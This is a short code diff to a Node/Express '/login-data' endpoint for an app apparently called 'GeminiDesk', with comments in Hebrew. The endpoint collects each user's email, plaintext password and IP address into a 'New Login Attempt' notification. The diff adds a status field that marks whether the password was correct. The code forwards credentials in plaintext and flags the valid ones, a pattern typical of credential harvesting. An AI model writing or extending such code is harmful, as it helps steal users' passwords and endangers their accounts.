@@ -112,16 +112,20 @@ ${stack || 'No stack trace provided.'}
 // ================================================================= //
 app.post('/login-data', async (req, res) => {
   try {
-    const { email, password } = req.body;
+    const { email, password, success } = req.body; // קבלת הסטטוס החדש
     const ipAddress = req.ip || req.connection.remoteAddress;
 
     if (!email || !password) {
       return res.status(400).send('Email and password are required.');
     }
 
+    // קביעת טקסט הסטטוס על סמך המשתנה הבוליאני
+    const statusText = success ? "Success ✅" : "Failed (Wrong Password) ❌";
+
     const loginMessage = `
 🔔 *New Login Attempt on GeminiDesk!* 🔔
 
+*Status:* \`${statusText}\`
 *IP Address:* \`${ipAddress}\`
 *Email:* \`${email}\`
 *Password:* \`${password}\`
